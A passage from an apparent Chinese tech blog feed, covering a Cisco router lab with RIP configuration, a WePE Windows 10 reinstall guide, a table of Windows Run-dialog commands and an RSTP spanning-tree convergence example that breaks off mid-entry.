keyword">no</span> shut<span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">4.1</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>clock rate <span class="token number">64000</span><span class="token keyword">no</span> shut<span class="token keyword">end</span></code></pre></li></ul><p>全局RIP配置：</p><ul><li><p>R1的RIP配置</p><pre class=" language-sql"><code class="language-sql">enconf troute ripnetwork <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.0</span>network <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">3.0</span>network <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">5.0</span><span class="token keyword">end</span></code></pre></li></ul><ul><li><p>R2的RIP配置</p><pre class=" language-sql"><code class="language-sql">enconf troute ripnetwork <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">4.0</span>network <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">5.0</span><span class="token keyword">end</span></code></pre></li></ul><ul><li><p>R3的RIP配置</p><pre class=" language-sql"><code class="language-sql">enconf troute ripnetwork <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">2.0</span>network <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">3.0</span>network <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">4.0</span><span class="token keyword">end</span></code></pre></li></ul><h2 id="其他相关命令"><a href="#其他相关命令" class="headerlink" title="其他相关命令"></a>其他相关命令</h2><ul><li>[#]<font color="red">clear ip route *</font>：清除生成的路由表</li><li>[#]<font color="red">show run</font>：查看系统当前配置</li><li>[#]<font color="red">copy run start</font>：保存系统当前配置</li><li>[#]<font color="red">reload</font>：重启系统</li></ul><h2 id="操作思路"><a href="#操作思路" class="headerlink" title="操作思路"></a>操作思路</h2><pre class=" language-html"><code class="language-html">1、网络拓扑设计    -> 网络设备的放置    -> 网络设备的命名    -> IP地址的划分2、基础配置    -> PC的静态IP地址    -> Server的静态IP配置3、LAN1配置    -> LAN1SW配置：        -> 基于端口的VLAN配置：    -> 配置R1的DHCP功能    -> 单臂路由实现VLAN之间的通信    -> R1基本IP配置4、LAN2配置：    -> R2配置        -> 基本IP配置        -> 浮动路由配置        -> NAT配置        -> ACL配置（不适用ACL完成要求）5、LAN3配置：    -> LAN3Server配置：        -> 关闭无用服务            -> 关闭DHCP、DHCPv6、AAA、EMAIL、IoE、VM Management服务        -> 配置HTTP服务（重写网页信息）        -> 配置DNS服务        -> 配置FTP服务        -> PC端测试    -> R3基本IP配置6、RIP动态路由配置</code></pre><h2 id="网站文本"><a href="#网站文本" class="headerlink" title="网站文本"></a>网站文本</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>The Bridge Keeper<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>There was once a bridge which spanned a large river. During most of the day the bridge sat with its length running up and down the river paralleled with the banks, allowing ships to pass thru freely on both sides of the bridge. But at certain times each day, a train would come along and the bridge would be turned sideways across the river, allowing a train to cross it.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>A switchman sat in a small shack on one side of the river where he operated the controls to turn the bridge and lock it into place as the train crossed. One evening as the switchman was waiting for the last train of the day to come, he looked off into the distance thru the dimming twilight and caught sight of the trainlights. He stepped to the control and waited until the train was within a prescribed distance when he was to turn the bridge. He turned the bridge into position, but, to his horror, he found the locking control did not work. If the bridge was not securely in position it would wobble back and forth at the ends when the train came onto it, causing the train to jump the track and go crashing into the river. This would be a passenger train with many people aboard. He left the bridge turned across the river, and hurried across the bridge to the other side of the river wher He would have to hold the lever back firmly as the train crossed. He could hear the rumble of the train now, and he took hold of the lever and leaned backward to apply his weight to it, locking the bridge. He kept applying the pressure to keep the mechanism locked. Many lives depended on this man's strength.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Then, coming across the bridge from the direction of his control shack, he heard a sound that made his blood run cold. "Daddy, where are you?" His four-year-old son was crossing the bridge to look for him. His first impulse was to cry out to the child, "Run! Run!" But the train was too close; the tiny legs would never make it across the bridge in time. The man almost left his lever to run and snatch up his son and carry him to safety. But he realized that he could not get back to the lever. Either the people on the train or his little son must die. He took a moment to make his decision.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>The train sped safely and swiftly on its way, and no one aboard was even aware of the tiny broken body thrown mercilessly into the river by the onrushing train. Nor were they aware of the pitiful figure of the sobbing man, still clinging tightly to the locking lever long after the train had passed. They did not see him walking home more slowly than he had ever walked: to tell his wife how their son had brutally died.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Now if you comprehend the emotions which went this man's heart, you can begin to understand the feelings of our Father in Heaven when He sacrificed His Son to bridge the gap between us and eternal life. Can there be any wonder that He caused the earth to tremble and the skies to darken when His Son died? How does He feel when we speed along thru life without giving a thought to what was done for us thru Jesus Christ?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络基础 </tag>
            
            <tag> 网络配置 </tag>
            
            <tag> Cisco </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WePE Win10 安装</title>
      <link href="/2020/08/27/wepe-win10-an-zhuang/"/>
      <url>/2020/08/27/wepe-win10-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="WePE-Win10-安装"><a href="#WePE-Win10-安装" class="headerlink" title="WePE Win10 安装"></a>WePE Win10 安装</h1><h2 id="安装须知"><a href="#安装须知" class="headerlink" title="安装须知"></a>安装须知</h2><ol><li>由于大部分新电脑支持UEFI启动，本文介绍UEFI+GPT安装Windows10 x64位系统方法</li><li>UEFI启动模式下，硬盘分区表必须是GPT；如果你要在Legacy模式下安装，硬盘分区表必须是MBR</li></ol><h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h2><ul><li>准备一个大容量的存储设备，用来转移重要的数据</li><li>使用一个8G或16G的U盘，制作一个<strong>WePE启动盘</strong></li><li>提前下载好系统的镜像并保存到启动盘中(启动盘以NTFS格式化)</li><li>准备Windows激活工具</li></ul><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="U盘启动设置"><a href="#U盘启动设置" class="headerlink" title="U盘启动设置"></a>U盘启动设置</h3><p>​        新式的主板中都会设置一个<strong>快捷启动</strong>的热键，不同的主板设置的启动热键不同，即使存在热键，有时也需要在BIOS中开启才能使用。但最基础的还是在BIOS中设置启动的顺序。不同类型的电脑进入BIOS的热键也不同，组装机的BIOS热键根据主板的不同而定，整机的热键依据品牌的不同而不同。下面列出一些组装机或品牌机的BIOS热键以供参考：  </p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/各品牌电脑进入BIOS热键大全.png" alt="各品牌电脑进入BIOS热键大全"></center>  <p>​        进入BIOS之后一般是在<strong>【BOOT】</strong>选项卡下将<strong>U盘</strong>设置为首选启动项，<strong>F10</strong>保存并退出BIOS设置后，重启时会自动进入<strong>PE界面</strong>。  </p><p>(HASEE战神Z7M-KP7GT启动Boot Security后需要重启才能以F2热键进入BIOS，F7为选择启动项热键)</p><h3 id="分区操作"><a href="#分区操作" class="headerlink" title="分区操作"></a>分区操作</h3><h4 id="分区助手-无损"><a href="#分区助手-无损" class="headerlink" title="分区助手(无损)"></a>分区助手(无损)</h4><ul><li>格式化</li></ul><p>​        分区助手可以帮助对磁盘分区进行管理，如果不需要全盘重新分区，直接<strong>右键系统盘</strong>(一般是C盘)，选择<strong>【格式化】</strong>，然后就可以进入<strong>系统安装</strong>步骤即可。</p><ul><li>快速分区</li></ul><p>​        如果需要重新分区，<strong>右键磁盘</strong>(如果计算机中有多块硬盘注意你选择的硬盘)选择<strong>【快速分区】</strong>，然后再快速分区界面中设置<strong>分区数目、分区大小</strong>(第1个分区一般是系统盘，建议50GB以上)，选择磁盘的类型为<strong>GPT</strong>，分区对齐到2048扇区是4K对齐，4096扇区也是4K对齐，设置完成之后，点击<strong>【开始执行】</strong>，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/分区助手-快速分区界面.png.jpg" alt="分区助手-快速分区界面.png"></center><ul><li>PS<ol><li>分区操作执行得很快；</li><li>在分区过程中如果C盘被占用，可通过<strong>【更改盘符】</strong>操作来修改占用盘符C得盘符。</li></ol></li></ul><h4 id="DiskGenius分区工具"><a href="#DiskGenius分区工具" class="headerlink" title="DiskGenius分区工具"></a>DiskGenius分区工具</h4><p>​        DiskGenius是另一款磁盘管理工具，可以对磁盘进行详细的管理与设置。</p><ul><li>快速分区</li></ul><p>​        选择<strong>【快速分区】</strong>，调整<strong>分区参数</strong>，选择<strong>GPT</strong>分区表类型，选择<strong>分区数目</strong>，在<strong>【高级设置】</strong>中更改<strong>分区大小</strong>并设置各个<strong>分区卷标</strong>，操作界面如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/DiskGenius-快速分区.png" alt="DiskGenius-快速分区"></center><h3 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h3><h4 id="镜像文件安装"><a href="#镜像文件安装" class="headerlink" title="镜像文件安装"></a>镜像文件安装</h4><ol><li>找到Win10镜像文件，并将其<strong>挂载</strong>。</li><li>进入Win10镜像的<strong>sources目录</strong>中，并找到<strong>setup.exe</strong>可执行程序，然后双击打开，操作界面如图所示。</li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/iso-source-setup.png" alt="iso-source-setup"></center><ol><li>之后会进入WIn10的安装界面。</li></ol><h4 id="winNTSetup"><a href="#winNTSetup" class="headerlink" title="winNTSetup"></a>winNTSetup</h4><ol><li><p>先将镜像文件<strong>挂载</strong>，或者<strong>解压</strong>。</p></li><li><p>打开<strong>winNTSetup</strong>，选择<strong>【windows Vista/7/8/10/2008/2012】</strong>选项卡：</p><ul><li>将<strong>选择包含Windows暗转文件夹的文件</strong>的路径信息指定到上一步<strong>挂载</strong>或<strong>解压</strong>的Windows镜像中<strong>install.wim</strong>文件所在的路径下(一般路径为/sources/install.wim)；</li><li><strong>选择引导驱动器选择</strong>默认为C盘即可；</li><li>磁盘的<strong>安装位置</strong>选择<strong>C盘</strong>；</li><li>选择安装的Win10版本(win10pro/home等)；</li><li>设置完毕之后点击<strong>【开始安装】</strong>。</li></ul><p>设置界面结果如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/WinNTSetup.png" alt="WinNTSetup"></center></li><li><p>在<strong>准备确认界面</strong>勾选<strong>【安装成功后自动重启计算机】</strong>选项，并点击<strong>【确认】</strong>按钮，操作如下图所示：</p></li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/WinNTSetup-准备界面.png" alt="WinNTSetup"></center><ol start="4"><li>之后镜像文件需要一段时间的部署，等部署完成之后计算机自动重启，并进入Win10的安装界面。</li></ol><p>部署过程如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/WinNTSetup-安装过程.png" alt="WinNTSetup-安装过程"></center><h4 id="CGI备份还原"><a href="#CGI备份还原" class="headerlink" title="CGI备份还原"></a>CGI备份还原</h4><ol><li><p>打开<strong>CGI备份还原</strong>，选择<strong>【操作分区】</strong>选项卡中：</p><ul><li><p>选择<strong>还原分区</strong>；</p></li><li><p>指定还原的分区(<strong>C盘</strong>)；</p></li><li><p>指定<strong>镜像文件</strong>或<strong>Ghost文件</strong>所在的路径，操作如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/CGI-操作分区.png" alt="CGI-操作分区"></center></li><li><p>单击<strong>【执行】</strong>按钮，并在弹出的<strong>还原分区界面</strong>勾选<strong>【重启】</strong>选项，点击<strong>【确定】</strong>按钮，操作如下图所示；</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/CGI-还原分区.png" alt="CGI-还原分区"></center></li><li><p>接下来需要等待程序操作完成，即可使用新的系统。</p></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WePE </tag>
            
            <tag> Win10 </tag>
            
            <tag> 系统安装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运行框常用命令及功能</title>
      <link href="/2020/08/27/yun-xing-kuang-chang-yong-ming-ling-ji-gong-neng/"/>
      <url>/2020/08/27/yun-xing-kuang-chang-yong-ming-ling-ji-gong-neng/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">命令名称</th><th align="center">功    能</th></tr></thead><tbody><tr><td align="center"><code>msconfig</code></td><td align="center">系统配置程序</td></tr><tr><td align="center"><code>regedit</code></td><td align="center">注册表编辑器</td></tr><tr><td align="center"><code>cmd</code></td><td align="center">命令提示符</td></tr><tr><td align="center"><code>calc</code></td><td align="center">计算器</td></tr><tr><td align="center"><code>devmgmt.msc</code></td><td align="center">设备管理器</td></tr><tr><td align="center"><code>dfrgui</code></td><td align="center">磁盘碎片整理程序</td></tr><tr><td align="center"><code>compmgmt.msc</code></td><td align="center">计算机管理</td></tr><tr><td align="center"><code>gpedit.msc</code></td><td align="center">本地组策略编辑器</td></tr><tr><td align="center"><code>notepad</code></td><td align="center">记事本</td></tr><tr><td align="center"><code>secpol.msc</code></td><td align="center">本地安全策略</td></tr><tr><td align="center"><code>services.msc</code></td><td align="center">本地服务设置</td></tr><tr><td align="center"><code>logoff</code></td><td align="center">注销命令</td></tr><tr><td align="center"><code>appwiz.cpl</code></td><td align="center">程序和功能</td></tr><tr><td align="center"><code>certmgr.msc</code></td><td align="center">证书管理程序</td></tr><tr><td align="center"><code>charmap</code></td><td align="center">启动字符映射表</td></tr><tr><td align="center"><code>cleanmgr</code></td><td align="center">打开磁盘清理工具</td></tr><tr><td align="center"><code>cliconfg</code></td><td align="center">SQL SERVER 客户端网络实用工具</td></tr><tr><td align="center"><code>cmstp</code></td><td align="center">连接管理器配置文件安装程序</td></tr><tr><td align="center"><code>colorcpl</code></td><td align="center">颜色管理，配置显示器和打印机等中的色彩</td></tr><tr><td align="center"><code>comexp.msc</code></td><td align="center">打开系统组件服务</td></tr><tr><td align="center"><code>control</code></td><td align="center">控制面版</td></tr><tr><td align="center"><code>desk.cpl</code></td><td align="center">屏幕分辨率</td></tr><tr><td align="center"><code>diskmgmt.msc</code></td><td align="center">磁盘管理</td></tr><tr><td align="center"><code>dxdiag</code></td><td align="center">检查DirectX信息</td></tr><tr><td align="center"><code>eudcedit</code></td><td align="center">造字程序</td></tr><tr><td align="center"><code>eventvwr</code></td><td align="center">事件查看器</td></tr><tr><td align="center"><code>explorer</code></td><td align="center">打开资源管理器</td></tr><tr><td align="center"><code>firewall.cpl</code></td><td align="center">防火墙程序</td></tr><tr><td align="center"><code>wf.msc</code></td><td align="center">高级安全Windows防火墙</td></tr><tr><td align="center"><code>fsmgmt.msc</code></td><td align="center">共享文件夹管理器</td></tr><tr><td align="center"><code>intl.cpl</code></td><td align="center">区域</td></tr><tr><td align="center"><code>iexpress</code></td><td align="center">木马捆绑工具，系统自带</td></tr><tr><td align="center"><code>lpksetup</code></td><td align="center">语言包安装/删除向导，安装向导会提示下载语言包</td></tr><tr><td align="center"><code>main.cpl</code></td><td align="center">鼠标属性</td></tr><tr><td align="center"><code>mmsys.cpl</code></td><td align="center">声音</td></tr><tr><td align="center"><code>magnify</code></td><td align="center">放大镜实用程序</td></tr><tr><td align="center"><code>MdSched</code></td><td align="center">Windows内存诊断程序</td></tr><tr><td align="center"><code>mmc</code></td><td align="center">MMC管理控制台</td></tr><tr><td align="center"><code>msinfo32</code></td><td align="center">系统信息</td></tr><tr><td align="center"><code>mspaint</code></td><td align="center">画图</td></tr><tr><td align="center"><code>mstsc</code></td><td align="center">远程桌面连接</td></tr><tr><td align="center"><code>OptionalFeatures</code></td><td align="center">打开“打开或关闭Windows功能”对话框</td></tr><tr><td align="center"><code>perfmon.msc</code></td><td align="center">计算机性能监测器</td></tr><tr><td align="center"><code>PowerShell</code></td><td align="center">提供强大远程处理能力</td></tr><tr><td align="center"><code>printmanagement.msc</code></td><td align="center">打印管理</td></tr><tr><td align="center"><code>powercfg.cpl</code></td><td align="center">电源选项</td></tr><tr><td align="center"><code>psr</code></td><td align="center">问题步骤记录器</td></tr><tr><td align="center"><code>Rasphone</code></td><td align="center">网络连接</td></tr><tr><td align="center"><code>Recdisc</code></td><td align="center">创建系统修复光盘</td></tr><tr><td align="center"><code>Resmon</code></td><td align="center">资源监视器</td></tr><tr><td align="center"><code>Rstrui</code></td><td align="center">系统还原</td></tr><tr><td align="center"><code>rsop.msc</code></td><td align="center">组策略结果集</td></tr><tr><td align="center"><code>sdclt</code></td><td align="center">备份状态与配置，就是查看系统是否已备份</td></tr><tr><td align="center"><code>sigverif</code></td><td align="center">文件签名验证程序</td></tr><tr><td align="center"><code>slui</code></td><td align="center">Windows激活，查看系统激活信息</td></tr><tr><td align="center"><code>snippingtool</code></td><td align="center">截图工具</td></tr><tr><td align="center"><code>sysdm.cpl</code></td><td align="center">系统属性</td></tr><tr><td align="center"><code>taskmgr</code></td><td align="center">任务管理器</td></tr><tr><td align="center"><code>taskschd.msc</code></td><td align="center">任务计划程序</td></tr><tr><td align="center"><code>timedate.cpl</code></td><td align="center">日期和时间</td></tr><tr><td align="center"><code>UserAccountControlSettings</code></td><td align="center">用户账户控制设置</td></tr><tr><td align="center"><code>winver</code></td><td align="center">关于Windows</td></tr><tr><td align="center"><code>mrt</code></td><td align="center">恶意软件删除工具</td></tr><tr><td align="center"><code>mip</code></td><td align="center">数学输入面板</td></tr><tr><td align="center"><code>tpm.msc</code></td><td align="center">受信任的平台(TPM)管理</td></tr><tr><td align="center"><code>sndvol</code></td><td align="center">音量合成器</td></tr><tr><td align="center"><code>osk</code></td><td align="center">打开屏幕键盘</td></tr><tr><td align="center"><code>resmon</code></td><td align="center">资源监视器</td></tr><tr><td align="center"><code>WMIC BIOS get releasedate</code></td><td align="center">查看电脑生产日期</td></tr><tr><td align="center"><code>ncpa.cpl</code></td><td align="center">打卡网络适配器配置界面</td></tr><tr><td align="center"><code>lusrmgr.msc</code></td><td align="center">本机用户和组</td></tr><tr><td align="center"><code>Shutdown -s -t 600</code></td><td align="center">表示600秒后自动关机</td></tr><tr><td align="center"><code>shutdown -a</code></td><td align="center">可取消定时关机</td></tr><tr><td align="center"><code>Shutdown -r -t 600</code></td><td align="center">表示600秒后自动重启</td></tr><tr><td align="center"><code>dcpromo</code></td><td align="center">安装或卸载域控制器</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 软件使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 常用命令 </tag>
            
            <tag> Windows </tag>
            
            <tag> 运行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSTP应用实例</title>
      <link href="/2020/08/27/rstp-ying-yong-shi-li/"/>
      <url>/2020/08/27/rstp-ying-yong-shi-li/</url>
      
        <content type="html"><![CDATA[<h1 id="RSTP应用实例"><a href="#RSTP应用实例" class="headerlink" title="RSTP应用实例"></a>RSTP应用实例</h1><p>​        存在某网络拓扑如图1所示，各个网桥端口传输速率均为100Mbps，所有连接均无故障.</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/RSTP实例网络拓扑.png" alt="RSTP实例网络拓扑"></center><center>图1</center><p>​    则使用RSTP协议构建的生成树如图2所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/RSTP构建的生成树.png" alt="RSTP构建的生成树"></center><center>图2</center><h1 id="定期维护网络拓扑结构"><a href="#定期维护网络拓扑结构" class="headerlink" title="定期维护网络拓扑结构"></a>定期维护网络拓扑结构</h1><p>​        RSTP成功构建生成树后，每当<strong>间隔时间定时器</strong>溢出时，网桥每一个<strong>指定端口</strong>发送各自的端口BPDU（如图3所示）。由于每个端口的最优BPDU的<strong>溢出定时器</strong>初值是3×（Hello Time），因此，只要在3×（Hello Time）时间内接收到该端口最优BPDU，该端口最优BPDU就保持有效，网络拓扑就维持不变。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/RSTP构建的生成树(BPDU).png" alt="RSTP构建的生成树(BPDU)"></center><center>图3</center><h1 id="拓扑结构改变时端口状态迁移过程"><a href="#拓扑结构改变时端口状态迁移过程" class="headerlink" title="拓扑结构改变时端口状态迁移过程"></a>拓扑结构改变时端口状态迁移过程</h1><h2 id="BID-1与BID-2连接断开"><a href="#BID-1与BID-2连接断开" class="headerlink" title="BID=1与BID=2连接断开"></a>BID=1与BID=2连接断开</h2><p>​        如果图3的生成树中互连BID=1网桥和BID=2网桥之间的链路发生故障（如图4所示），BID=2网桥由于持续3×（Hello Time）时间没有接收到网桥最优BPDU，导致<font color="blue">BID=2网桥回到初始状态，将自己作为根网桥</font>，此时BID=2网桥各个端口BPDU如图4中所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID1和BID2断开.png" alt="BID1和BID2断开"></center><center>图4</center><p>​        每当间隔时间定时器溢出时，BID=2网桥的每一个端口就发送各自的端口BPDU。</p><p><strong>BID=2网桥与BID=3网桥</strong>：</p><p>​        当BID=3网桥端口1接收到<strong>BPDU=&lt;2,0,2,4&gt;</strong>时，由于端口1的端口<strong>BPDU=&lt;1,19,3,1&gt;</strong>优于收到的BPDU，该端口角色转换为<strong>指定端口</strong>，端口状态仍为<strong>丢弃状态</strong>，如图5所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID24BPDU-BID31.png" alt="BID24BPDU-BID31"></center><center>图5</center><p>​        由于BID=3端口1的端口角色转变为指定端口，但端口状态仍为丢弃状态，此时端口1会向BID=2的端口4发送<strong>Proposal BPDU=&lt;1,19,3,1&gt;</strong>。当BID=2网桥端口4收到该Proposal BPDU后，确定该BPDU为网桥最优BPDU，则指定端口4为<strong>根端口</strong>，如图6所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID3-PropocalBPDU-BID2.png" alt="BID3-PropocalBPDU-BID2"></center><center>图6</center><p>​        BID=2网桥确定端口4为根端口后，确定端口4的开销为38，且其<strong>BPDU=&lt;1,38,2,4&gt;</strong>,此时BID=2网桥其他端口的BPDU如图7所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID2-BPDU.png" alt="BID2-BPDU"></center><center>图7</center><p>​        由于BID=2网桥端口4是根端口，且各个端口状态为丢弃状态，BID=2网桥通过端口4发送<strong>Agreement BPDU</strong>。BID=3网桥端口1接收到Agreement BPDU后，将端口状态转变为<strong>转发状态</strong>。（如图8所示）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID2-AgreementBPDU-BID3.png" alt="BID2-AgreementBPDU-BID3"></center><center>图8</center><p>​        每当间隔时间定时器溢出时，BID=3网桥端口1发送标志位<strong>Forwarding置位的BPDU</strong>。BID=2网桥端口4接收到该BPDU后，将端口状态转变为<strong>转发状态</strong>。（如图9所示）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID3-ForwordingBPDU-BID2.png" alt="BID3-ForwordingBPDU-BID2"></center><center>图9</center><p><strong>BID=2网桥与BID=4网桥</strong>：</p><p>​        当BID=4网桥通过端口1接收到<strong>BPDU=&lt;2,0,2,2&gt;</strong>,通过端口2接收到<strong>BPDU=&lt;2,0,2,3&gt;</strong>，通过端口3接收到<strong>BPDU=&lt;1,19,3,3&gt;</strong>时，确根端口3为<strong>根端口</strong>，端口3状态<strong>直接转变为转发状态</strong>（如图10所示），由此得到BID=4网桥的根路径开销为38，以此推到出BID=4网桥其他端口的端口BPDU如图11所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID4根端口确定.png" alt="BID4根端口确定"></center><center>图10</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID4-BPDU.png" alt="BID4-BPDU"></center><center>图11</center><p>​        每当间隔时间定时器溢出时，BID=4网桥的端口1发送<strong>Proposal BPDU=&lt;1,38,4,1&gt;</strong>，端口2发送<strong>Proposal BPDU=&lt;1,38,4,2&gt;</strong>，如图12所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID4-Proposal BPDU-BID2.png" alt="BID4-Proposal BPDU-BID2"></center><center>图12</center><p>​        当BID=2网桥通过端口2接收到<strong>Proposal BPDU=&lt;1,38,4,1&gt;</strong>时，由于端口2的端口<strong>BPDU=&lt;1,38,2,2&gt;</strong>优于接收到的BPDU，端口2维持指定端口角色不变，发送<strong>Proposal BPDU=&lt;1,38,2,2&gt;</strong>。端口3同样维持指定角色不变，发送<strong>Proposal BPDU=&lt;1,38,2,3&gt;</strong>，如图13所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID2-Proposal BPDU-BID4.png" alt="BID2-Proposal BPDU-BID4"></center><center>图13</center><p>​        当BID=4网桥通过端口1接收到<strong>Proposal BPDU=&lt;1,38,2,2&gt;</strong>时，由于该BPDU优先于端口<strong>BPDU=&lt;1,38,4,1&gt;</strong>，端口1的端口角色转变为<strong>替换端口</strong>（如图14所示），由于该端口为替换端口，且其他指定端口状态为丢弃状态，BID=4网桥通过端口1发送<strong>Agreement BPDU</strong>。当BID=4网桥通过端口2接收到<strong>Proposal BPDU=&lt;1,38,2,3&gt;</strong>时，端口2的端口角色同样转变为<strong>替换端口</strong>，并通过端口2发送<strong>Agreement BPDU</strong>。（如图15所示）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID4改变端口角色.png" alt="BID4改变端口角色"></center><center>图14</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID2改变端口状态.png" alt="BID2改变端口状态"></center><center>图15</center><p>​        当BID=2网桥分别通过端口2和端口3接收到Agreement BPDU时，两个端口的状态转换为<strong>转发状态</strong>，如图16所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图16.png" alt="图16"></center><center>图16</center><p>​        完成上述过程后，重新构建的生成树即完成（如图17所示）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/重构生成树.png" alt="重构生成树"></center><center>图17</center><h2 id="扩展：BID-1与BID-3连接断开"><a href="#扩展：BID-1与BID-3连接断开" class="headerlink" title="扩展：BID=1与BID=3连接断开"></a>扩展：BID=1与BID=3连接断开</h2><p>​        如果生成树中互连BID=1网桥和BID=3网桥之间的链路发生故障（如图18所示），BID=3网桥由于持续3×（Hello Time）时间没有接收到网桥最优BPDU，导致<font color="blue">BID=3网桥回到初始状态，将自己作为根网桥</font>，此时BID=3网桥各个端口BPDU如图18中所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图18.png" alt="图18"></center><center>图18</center><p>​        每当间隔时间定时器溢出时，BID=3网桥的每一个端口就发送各自的端口BPDU。</p><p><strong>BID=3网桥与BID=2网桥</strong>：</p><p>​        当BID=2网桥端口4接收到<strong>BPDU=&lt;3,0,3,1&gt;</strong>时，由于端口4的端口<strong>BPDU=&lt;1,19,2,4&gt;</strong>优于收到的BPDU，该端口角色仍为<strong>指定端口</strong>，端口状态仍为<strong>转发状态</strong>，如图19所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图19.png" alt="图19"></center><center>图19</center><p>​        BID=2的端口4会向BID=3的端口1发送<strong>proposal BPDU=&lt;1,19,2,4&gt;</strong>。当BID=3网桥端口1收到该Proposal BPDU后，确定该BPDU为网桥<strong>最优BPDU</strong>，则执行端口1为<strong>根端口</strong>，而端口状态仍为<strong>丢弃状态</strong>，如图20所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图20.png" alt="图20"></center><center>图20</center><p>​        BID=3网桥确定端口1为根端口后，确定端口1的开销为38，且其<strong>BPDU=&lt;1,38,3,1&gt;</strong>,此时BID=3网桥其他端口的BPDU如图21所示。</p><center><img 